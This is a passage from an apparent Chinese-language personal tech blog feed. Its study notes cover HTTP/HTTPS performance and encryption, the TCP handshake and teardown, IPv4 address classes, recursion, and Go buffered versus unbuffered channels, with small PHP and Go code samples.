的性能"></a>HTTP 的性能</h2><p>HTTP 协议是基于 TCP/IP，并且使用了「请求 - 应答」的通信模式，所以性能的关键就在这两点里。</p><h3 id="1-长连接"><a href="#1-长连接" class="headerlink" title="1. 长连接"></a>1. 长连接</h3><p>早期 HTTP/1.0 性能上的一个很大的问题，那就是每发起一个请求，都要新建一次 TCP 连接(三次握手)，而且是串行请求，做了无谓的 TCP 连接建立和断开，增加了通信开销。</p><p>为了解决上述 TCP 连接问题，HTTP/1.1 提出了⻓连接的通信方式，也叫持久连接。这种方式的好处在于减少了 TCP 连接的􏰂复建立和断开所造成的额外开销，减轻了服务器端的负载。</p><p>持久连接的特点是，只要任意一端没有明确提出断开连接，则保持 TCP 连接状态。</p><h3 id="2-管道网络传输"><a href="#2-管道网络传输" class="headerlink" title="2. 管道网络传输"></a>2. 管道网络传输</h3><p>HTTP/1.1 采用了⻓连接的方式，这使得管道(pipeline)网络传输成为了可能。</p><p>即可在同一个 TCP 连接里面，客户端可以发起多个请求，只要第一个请求发出去了，不必等其回来，就可以发第 二个请求出去，可以减少整体的响应时间。</p><p>举例来说，客户端需要请求两个资源。以前的做法是，在同一个TCP连接里面，先发送 A 请求，然后等待服务器做 出回应，收到后再发出 B 请求。管道机制则是允许浏览器同时发出 A 请求和 B 请求。</p><p>但是服务器还是按照顺序，先回应 A 请求，完成后再回应 B 请求。要是前面的回应特别慢，后面就会有许多请求 排队等着。这称为「队头堵塞」。</p><h3 id="3-对头阻塞"><a href="#3-对头阻塞" class="headerlink" title="3. 对头阻塞"></a>3. 对头阻塞</h3><p>「请求 - 应答」的模式加剧了 HTTP 的性能问题。</p><p>因为当顺序发送的请求序列中的一个请求因为某种原因被阻塞时，在后面排队的所有请求也一同被阻塞了，会导致客户端一直请求不到数据，这也就是「队头阻塞」。好比上班的路上塞⻋。</p><h2 id="HTTP-与-HTTPS"><a href="#HTTP-与-HTTPS" class="headerlink" title="HTTP 与 HTTPS"></a>HTTP 与 HTTPS</h2><h3 id="HTTP-与-HTTPS-的区别"><a href="#HTTP-与-HTTPS-的区别" class="headerlink" title="HTTP 与 HTTPS 的区别"></a>HTTP 与 HTTPS 的区别</h3><ol><li>HTTP 是超文本传输协议，信息是明文传输，存在安全风险的问题。HTTPS 则解决了 HTTP 不安全的缺陷，在 TCP 和 HTTP 网络层之间加入了 SSL/TLS 安全协议，使得报文能够加密传输。</li><li>HTTP 连接建立相对简单， TCP 三次握手之后便可以进行 HTTP 的报文传输。而 HTTPS 在 TCP 三次握手之后，还需要建立 SSL/TLS 的握手过程，才能进行加密报文传输。</li><li>HTTP 的端口号是 80，HTTPS 的端口号是 443。</li><li>HTTPS 协议需要向 CA(证书权威机构)申请数字证书，来保证服务器的身份是可信的。</li></ol><h3 id="HTTPS-解决了哪些问题"><a href="#HTTPS-解决了哪些问题" class="headerlink" title="HTTPS 解决了哪些问题"></a>HTTPS 解决了哪些问题</h3><p>HTTPS 在 HTTP 与 TCP 层之间加入了 SSL/TLS 协议，可以很好的解决了上述的⻛险:</p><ul><li><strong>信息加密</strong>：通信内容进行加密。混合加密的方式实现信息的加密传输，解决了窃听的风险</li><li><strong>校验机制</strong>：无法篡改通信内容。摘要算法的方式来实现完整性，它能够为数据生成独一无二的「指纹」，指纹用于校验数据的完整性，解决了 篡改的⻛险。</li><li><strong>身份证书</strong>：将服务器公钥放入到数字证书中，解决了冒充的⻛险。</li></ul><p><strong>1. 混合加密</strong></p><p>混合加密的方式实现信息的加密传输，解决了窃听的风险。</p><p>HTTP 采用的是<strong>对称加密</strong>和<strong>非对称加密</strong>结合的『混合加密』方式：</p><ul><li>在通信建立前，采用<strong>非对称加密</strong>的方式交换『会话密钥』，后续通信就不使用非对称加密了</li><li>在通信过程中，全部使用<strong>对称加密</strong>的『会话密钥』的方式加密明文数据。</li></ul><p>之所以这么做的原因是因为：</p><ul><li>对称加密只使用一个密钥，运算速度快，密钥必须保密，无法做到安全的密钥交换。 </li><li>非对称加密使用两个密钥：公钥和私钥，公钥可以任意分发而私钥保密，解决了密钥交换问题但速度慢。</li></ul><p><strong>2. 摘要算法</strong><br>摘要算法用来实现完整性，能够为数据生成独一无二的「指纹」，用于校验数据的完整性，解决了篡改的⻛险。</p><p>客户端在发送明文之前会通过摘要算法算出明文的「指纹」，发送的时候把「指纹 + 明文」一同加密成密文后，发 送给服务器，服务器解密后，用相同的摘要算法算出发送过来的明文，通过比较客户端携带的「指纹」和当前算出 的「指纹」做比较，若「指纹」相同，说明数据是完整的。</p><p><strong>3. 数字证书</strong><br>客户端先向服务器端索要公钥，然后用公钥加密信息，服务器收到密文后，用自己的私钥解密。 </p><blockquote><p>这就存在一些问题，如何保证公钥不被篡改和信任度?</p></blockquote><p>所以这里就需要借助第三方权威机构 CA (数字证书认证机构)，<strong>将服务器公钥放在数字证书(由数字证书认证 机构颁发)中，只要证书是可信的，公钥就是可信的</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220928145219.png" alt=""></p><p>通过数字证书的方式保证服务器公钥的身份，解决冒充的⻛险。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习——03 TCP 协议篇</title>
      <link href="/computer-network-learning-03-tcp-protocol/"/>
      <url>/computer-network-learning-03-tcp-protocol/</url>
      
        <content type="html"><![CDATA[<p>什么是 TCP？</p><a id="more"></a><p>TCP 是面向连接的、可靠的、基于字节流的传输层通信协议。</p><ul><li><strong>面向连接</strong>：一定是『一对一』才能连接，不能像 UDP 协议可以一个主机同时向多个主机发送消息，也就是一对多无法做到。</li><li><strong>可靠的</strong>：无论网络链路中出现了怎样的链路变化，TCP 都可以保证一个报文一定能够到达接收端。</li><li><strong>字节流</strong>：消息是『没有边界』的，所以无论我们消息有多大都可以进行传输。并且消息是『有序的』，当『前一个』消息没有收到的时候，即使它先收到了后面的字节，那么也不能扔给应用层去处理，同时对『重复』的报文会自动丢弃。</li></ul><p>简述三次握手过程：</p><ul><li>第一次握手，客户端给服务发送一个 syn 包，等待服务端确认</li><li>第二次握手，当服务端受到请求之后，此时要给客户端一个确认信息 ack，并同时发送 syn 包，等待客户端确认</li><li>第三次握手，客户端受到服务端发送的 ack + syn 包之后，向服务端发送 ack</li></ul><p>为什么 TCP 握手是三次，不是两次或者四次？</p><p>因为三次握手才能保证双方具有接收和发送的能力。这个回答没有问题，但是比较片面，没有说出主要原因。</p><p>不使用「两次握手」和「四次握手」的原因:</p><ul><li>「两次握手」：无法防止历史连接的建立，会造成双方资源的浪费，也无法可靠的同步双方序列号;</li><li>「四次握手」：三次握手就已经理论上最少可靠连接建立，所以不需要使用更多的通信次数。</li></ul><p>四次挥手过程：</p><ul><li>客户端打算关闭连接，此时会发送一个 TCP 首部 FIN 标志位被置为 1 的报文，也即 FIN 报文，之后客户 端进入 FIN_WAIT_1 状态。</li><li>服务端收到该报文后，就向客户端发送 ACK 应答报文，接着服务端进入 CLOSED_WAIT 状态。 客户端收到服务端的 ACK 应答报文后，之后进入 FIN_WAIT_2 状态。 </li><li>等待服务端处理完数据后，也向客户端发送 FIN 报文，之后服务端进入状态。 </li><li>客户端收到服务端的 FIN 报文后，回一个 ACK 应答报文，之后进入   状态</li><li>服务器收到了 ACK 应答报文后，就进入了状态，至此服务端已经完成连接的关闭。 </li><li>客户端在经过 2MSL 一段时间后，自动进入   状态，至此客户端也完成连接的关闭。</li></ul><p>可以看到，每个方向都需要一个 FIN 和一个 ACK，因此通常被称为四次挥手。</p><p>为什么要四次挥手？</p><p>两次握手就可以释放一端到另一端的 TCP 连接，而完全释放连接则一共需要四次握手。</p><p>TCP 和 TDP 区别：<br><strong>1. 连接</strong></p><ul><li>TCP 是面向连接的传输层协议，传输数据前先要建立连接。</li><li>UDP 则不需要建立连接，即刻传输数据。</li></ul><p><strong>2. 服务对象</strong></p><ul><li>TCP 是一对一的两点服务，即一点连接只有两个端点</li><li>UDP 支持一对一、一对多、多对多的交互通信</li></ul><p><strong>3. 可靠性</strong></p><ul><li>TCP 是可靠交付数据的，数据可以无差错、不丢失、不重复、按需到达</li><li>UDP 是尽最大努力交付，不保证可靠交付数据</li></ul><p><strong>4. 拥塞控制、流量控制</strong></p><ul><li>TCP 有拥塞控制和流量控制机制，保证数据传输的安全性</li><li>UDP 则没有，即使网络非常拥堵了，也不会影响 UDP 的发送速率</li></ul><p><strong>5. 首部开销</strong> </p><ul><li>TCP 首部⻓度较⻓，会有一定的开销，首部在没有使用「选项」字段时是 20 个字节，如果使用了「选项」 字段则会变⻓的。</li><li>UDP 首部只有 8 个字节，并且是固定不变的，开销较小。</li></ul><p><strong>6. 传输方式</strong></p><ul><li>TCP 是流式传输，没有边界，但保证顺序和可靠。</li><li>UDP 是一个包一个包的发送，是有边界的，但可能会丢包和乱序。 </li></ul><p><strong>7. 分片不同</strong></p><ul><li>TCP 的数据大小如果大于 MSS 大小，则会在传输层进行分片，目标主机收到后，也同样在传输层组装 TCP 数据包，如果中途丢失了一个分片，只需要传输丢失的这个分片。</li><li>UDP 的数据大小如果大于 MTU 大小，则会在 IP 层进行分片，目标主机收到后，在 IP 层组装完数据，接着再 传给传输层，但是如果中途丢了一个分片，在实现可靠传输的 UDP 时则就需要􏰂传所有的数据包，这样传输 效率非常差，所以通常 UDP 的报文应该小于 MTU。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习——02 IP 篇</title>
      <link href="/computer-network-learning-02-ip/"/>
      <url>/computer-network-learning-02-ip/</url>
      
        <content type="html"><![CDATA[<p>计算机网络学习——02 IP 篇</p><a id="more"></a><h2 id="IP-基本认识"><a href="#IP-基本认识" class="headerlink" title="IP 基本认识"></a>IP 基本认识</h2><p>IP 在 TCP/IP 参考模型中处于第三层，也就是网络层。</p><p>网络层的主要作用是：实现主机与主机之间的通信，也叫点对点（end to end）通信。</p><p>IP 的作用是在复杂的网络环境中，<strong>将数据包发送给最终目的主机</strong>。</p><h3 id="IP-与-MAC-的作用"><a href="#IP-与-MAC-的作用" class="headerlink" title="IP 与 MAC 的作用"></a>IP 与 MAC 的作用</h3><p>IP 的作用是主机之间进行通信的，而 MAC 的作用是实现『直连』的两个设备之间通信，而 IP 则负责在「没有直连」的两个网络之间进行通信传输。</p><p>举个栗子。</p><p>小林要去一个很远的地方旅行，制定了一个行程表，其间需先后乘坐⻜机、地铁、公交⻋才能抵达目的地，为此小林需要买⻜机票，地铁票等。</p><p>⻜机票和地铁票都是去往特定的地点的，每张票只能够在某一限定区间内移动，此处的「区间内」就如同通信网络中数据链路。</p><p><strong>在区间内移动相当于数据链路层，充当区间内两个节点传输的功能</strong>，区间内的出发点好比源 MAC 地址，目标地点 好比目的 MAC 地址。</p><p>整个旅游行程表就相当于网络层，充当远程定位的功能，行程的开始好比源 IP，行程的终点好比目的 IP 地址。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221009154601.png" alt=""></p><p>如果小林只有行程表而没有⻋票，就无法搭乘交通工具到达目的地。相反，如果除了⻋票而没有行程表，恐怕也很难到达目的地。因为小林不知道该坐什么⻋，也不知道该在哪里换乘。</p><p>因此，只有两者兼备，既有某个区间的⻋票又有整个旅行的行程表，才能保证到达目的地。与此类似，计算机网络 中也需要「数据链路层」和「网络层」这个分层才能实现向最终目标地址的通信。</p><p>还有􏰀要一点，旅行途中我们虽然不断变化了交通工具，但是旅行行程的起始地址和目的地址始终都没变。其实， 在网络中数据包传输中也是如此，<strong>源IP地址和目标IP地址在传输过程中是不会变化的，只有源 MAC 地址和目标 MAC 一直在变化</strong>。</p><h2 id="IP-地址基础知识"><a href="#IP-地址基础知识" class="headerlink" title="IP 地址基础知识"></a>IP 地址基础知识</h2><p>在 TCP/IP 网络通信时，为了保证能正常通信，每个设备都需要配置正确的 IP 地址，否则无法实现正常的通信。</p><p>IP 地址(IPv4 地址)由 32 位正整数来表示，IP 地址在计算机是以二进制的方式处理的。</p><p>而人类为了方便记忆采用了点分十进制的标记方式，也就是将 32 位 IP 地址以每 8 位为组，共分为 4 组，每组以 「 . 」隔开，再将每组转换成十进制。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220929204536.png" alt=""></p><h3 id="IP-地址的分类"><a href="#IP-地址的分类" class="headerlink" title="IP 地址的分类"></a>IP 地址的分类</h3><h4 id="1-网络地址"><a href="#1-网络地址" class="headerlink" title="1. 网络地址"></a>1. 网络地址</h4><p>IP地址由网络号（包括子网号）和主机号组成，网络地址的主机号为全0，网络地址代表着整个网络。</p><h4 id="2-广播地址"><a href="#2-广播地址" class="headerlink" title="2. 广播地址"></a>2. 广播地址</h4><p>广播地址通常称为直接广播地址，是为了区分受限广播地址。</p><p>广播地址与网络地址的主机号正好相反，广播地址中，主机号为全1。当向某个网络的广播地址发送消息时，该网络内的所有主机都能收到该广播消息。</p><h4 id="3-组播地址"><a href="#3-组播地址" class="headerlink" title="3. 组播地址"></a>3. 组播地址</h4><p>D类地址就是组播地址。</p><p>先回忆下A，B，C，D类地址吧：</p><ol><li>A类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255；(modified @2016.05.31)</li><li>B类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255;</li><li>C类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255。</li><li>D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通信）；</li><li>E类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。</li></ol><p>注：只有A、B、C 有网络号和主机号之分，D类地址和E类地址没有划分网络号和主机号。</p><h4 id="4-255-255-255-255"><a href="#4-255-255-255-255" class="headerlink" title="4. 255.255.255.255"></a>4. 255.255.255.255</h4><p>该IP地址指的是受限的广播地址。受限广播地址与一般广播地址（直接广播地址）的区别在于，受限广播地址只能用于本地网络，路由器不会转发以受限广播地址为目的地址的分组；一般广播地址既可在本地广播，也可跨网段广播。</p><p>例如：主机192.168.1.1/30上的直接广播数据包后，另外一个网段192.168.1.5/30也能收到该数据报；若发送受限广播数据报，则不能收到。</p><p>注：一般的广播地址（直接广播地址）能够通过某些路由器（当然不是所有的路由器），而受限的广播地址不能通过路由器。</p><h4 id="5-0-0-0-0"><a href="#5-0-0-0-0" class="headerlink" title="5. 0.0.0.0"></a>5. 0.0.0.0</h4><p>常用于寻找自己的IP地址，例如在我们的RARP，BOOTP和DHCP协议中，若某个未知IP地址的无盘机想要知道自己的IP地址，它就以255.255.255.255为目的地址，向本地范围（具体而言是被各个路由器屏蔽的范围内）的服务器发送IP请求分组。</p><h4 id="6-回环地址"><a href="#6-回环地址" class="headerlink" title="6. 回环地址"></a>6. 回环地址</h4><p>127.0.0.0/8被用作回环地址，回环地址表示本机的地址，常用于对本机的测试，用的最多的是127.0.0.1。</p><h4 id="7-A、B、C类私有地址"><a href="#7-A、B、C类私有地址" class="headerlink" title="7. A、B、C类私有地址"></a>7. A、B、C类私有地址</h4><p>私有地址(private address)也叫专用地址，它们不会在全球使用，只具有本地意义：</p><ol><li>A类私有地址：10.0.0.0/8，范围是：10.0.0.0~10.255.255.255</li><li>B类私有地址：172.16.0.0/12，范围是：172.16.0.0~172.31.255.255</li><li>C类私有地址：192.168.0.0/16，范围是：192.168.0.0~192.168.255.255</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://xiaolincoding.com/network/" target="_blank" rel="noopener">图解网络——小林coding</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法学习笔记——递归</title>
      <link href="/algorithm-learning-recursion/"/>
      <url>/algorithm-learning-recursion/</url>
      
        <content type="html"><![CDATA[<p>算法学习笔记——递归</p><a id="more"></a><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>每个递归函数都要有两部分：</p><ol><li>基线条件：递归的结束条件，从而避免形成无限循环</li><li>递归条件：函数调用自己</li></ol><p>下面结合一个实际的例子来理解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fib</span><span class="params">($n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($n &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="comment">// 基线条件</span></span><br><span class="line">        <span class="keyword">return</span> $n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 递归条件</span></span><br><span class="line">    <span class="keyword">return</span> fib($n<span class="number">-1</span>) + fib($n - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如何写好一个递归，要多去思考上面的两个条件应该怎么写。</p><h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><p>栈是一种简单的数据结构，在使用递归时，用到了调用栈。</p><p>用于存储多个函数的变量的栈，被称为调用栈。</p><p>每当调用一个函数，计算机会将函数调用所涉及的所有变量的值存储到内存中，如果此时，再次调用了另一个函数，那么计算机也会为这个函数调用分配一块内存。</p><p>计算机使用一个栈来表示这些内存块，其中第二个内存块位于第一个内存块上面。如果函数调用返回，此时，栈顶的内存块就会被弹出。</p><p>下面用一张图来解释调用栈的过程：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221030191637.png" alt=""></p><p>使用栈虽然很方便，但是也要付出代价：存储调用栈的详尽信息需要占用大量的内存。因为每个函数调用都需要占用一定的内存，如果栈很高，就意味着计算机存储了大量函数调用的信息。</p><p>在这种情况下，就不建议继续使用递归了，有两种选择：</p><ol><li>使用循环</li><li>使用尾递归</li></ol><p>例如 <a href="https://leetcode.cn/problems/climbing-stairs/" target="_blank" rel="noopener">Leetcode 的第70题</a>，既可以用递归解决，也可以使用循环（动态规划）解决，但是前者在达到一定深度之后，执行时间就会变得很长。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——如何理解 channel 的无缓冲带和有缓冲带</title>
      <link href="/go-language-study-notes-how-to-understand-the-channel-without-buffer-and-with-buffer/"/>
      <url>/go-language-study-notes-how-to-understand-the-channel-without-buffer-and-with-buffer/</url>
      
        <content type="html"><![CDATA[<p>channel 是否有缓冲带，其行为会有一些不同。理解这个差异对决定到底应该使不使用缓冲带很有帮助。</p><a id="more"></a><h2 id="理解无缓冲带-channel"><a href="#理解无缓冲带-channel" class="headerlink" title="理解无缓冲带 channel"></a>理解无缓冲带 channel</h2><p>使用无缓冲带 channel 进行接收和发送操作时，一定要注意，接收和发送操作不能放在同一个 goroutine 中，否则是没有意义的。</p><p>为什么这么说呢？<br>这是因为无缓冲带 channel 的特点是，<strong>同步阻塞</strong>。</p><p>无缓冲带，可以分为两种情况：</p><ol><li>从无缓冲带 channel 接收数据时，如果同时没有发送者发送数据，那么则会一直阻塞，直到有发送者出现进行发送。</li><li>向无缓冲带 channel 发送数据，如果同时没有接收者进行接收，那么则会一直阻塞，直到有接收者出现进行接收。</li></ol><p>结合下面这个图进行理解，也就是无缓冲带 channel 只有同时具备接收和发送能力才会继续往下执行。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221129174724.png" alt=""></p><p>结合下面的示例代码来理解：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 无缓冲带</span></span><br><span class="line">ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line">ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>)</span><br><span class="line"></span><br><span class="line">ch1 = ch2</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"go"</span>)</span><br><span class="line">ch2 &lt;- <span class="number">123</span></span><br><span class="line"></span><br><span class="line">i := &lt;-ch1</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">time.Sleep(<span class="number">10</span> * time.Second)</span><br><span class="line">fmt.Println(<span class="string">"done"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是无论 time.Sleep 休息多少秒， goroutine 中的 123 都不会打印出来。因为 goroutine  阻塞在 <code>ch2 &lt;- 123</code> 这行代码了。</p><p>那么应该怎么改写， 123 才会打印出来呢？</p><p>只需要将发送数据这一行代码移出 goroutine 即可：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">  fmt.Println(<span class="string">"go"</span>)</span><br><span class="line"></span><br><span class="line">  i := &lt;-ch1</span><br><span class="line">  fmt.Println(i)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">ch2 &lt;- <span class="number">123</span></span><br></pre></td></tr></table></figure><p>运行上面的示例代码，输出如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span></span><br><span class="line"><span class="number">123</span></span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>符合预期。</p><h2 id="理解有缓冲带-channel"><a href="#理解有缓冲带-channel" class="headerlink" title="理解有缓冲带 channel"></a>理解有缓冲带 channel</h2><p>很多资料或者文章里面会说，有缓冲带 channel 是<strong>异步非阻塞</strong>的，这个异步到底该如何理解呢？</p><p>有缓冲带，可以分为四种情况：</p><ol><li>如果缓冲带已满，那么对它的所有<strong>发送操作都会被阻塞</strong>，直到缓冲带中有元素值被接收</li><li>如果缓冲带已空，那么对它的所有<strong>接收操作都会被阻塞</strong>，直到通道中有新的元素值出现</li><li>如果缓冲带未满，那么对它的所有<strong>发送操作都不会阻塞</strong></li><li>如果缓冲带非空，那么对它的所有<strong>接收操作都不会阻塞</strong></li></ol><p>上面所说异步非阻塞，就是针对第三四种情况的，而第一二种情况，在缓冲带已满、已空时，就和无缓冲带一样了，因此也会是同步阻塞的。</p><p>下面用一段示例代码来加深理解。<br>还是上面的示例代码，只是初始化 channel 时，使用的是有缓冲带的 channel。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">ch1 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line">ch2 := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ch1 = ch2</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"go"</span>)</span><br><span class="line">ch2 &lt;- <span class="number">123</span></span><br><span class="line"></span><br><span class="line">i := &lt;-ch1</span><br><span class="line">fmt.Println(i)</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">fmt.Println(<span class="string">"done"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行一下，输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go</span><br><span class="line">123</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>为什么现在就打印出 123 来了？<br>正是因为有缓冲带的存在，有缓冲带 channel 不需要同时具有接收和发送能力，才能继续往下执行，数据的发送者将数据放在缓冲带即可，而无需等待数据的接收者出现。</p><p>结合下面这个图进行理解：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221129174810.png" alt=""></p><p>在这个过程里面，两个操作不是同步的，因此就说有缓冲带 channel 是异步非阻塞。</p><p>这两种类型的缓冲带，各自有各自的特点，有的场景仅适合使用无缓冲带 channel，有的场景则只适合使用有缓冲带 channel，不过，也有两种缓冲带都可以使用的场景。</p><h2 id="一个示例"><a href="#一个示例" class="headerlink" title="一个示例"></a>一个示例</h2><p>下面这个示例就是两种缓冲带都可以使用的场景。</p><p>先来看看示例代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter, req *http.Request)</span></span> &#123;</span><br><span class="line">fmt.Fprintln(w, <span class="string">"hello go"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">"/hello"</span>, hello)</span><br><span class="line"></span><br><span class="line">keepPrinting()</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">"App runs on port 9999."</span>)</span><br><span class="line">log.Fatal(http.ListenAndServe(<span class="string">":9999"</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">keepPrinting</span><span class="params">()</span></span> &#123;</span><br><span class="line">i := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">i++</span><br><span class="line">log.Println(<span class="string">"i = "</span>, i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了方便后面 goroutine 的使用，这里启动了一个 HTTP 服务。</p><p>函数 keepPrinting 的作用很简单，在一个不会主动停止的 for 循环中，一直打印变量 i 的值。</p><p>运行这段示例代码，会发现终端一直有输出：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">25</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">37</span> i =  <span class="number">243979</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">25</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">37</span> i =  <span class="number">243980</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">25</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">37</span> i =  <span class="number">243981</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">25</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">37</span> i =  <span class="number">243982</span></span><br><span class="line"><span class="number">2022</span>/<span class="number">11</span>/<span class="number">25</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">37</span> i =  <span class="number">243983</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这时，访问一下刚刚启动的 Web 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -I http://localhost:9999/hello</span><br><span class="line">HTTP/1.1 502 Bad Gateway</span><br></pre></td></tr></table></figure><p>怎么状态码是 502，不是 200？<br>这是因为 main goroutine 一直在 for 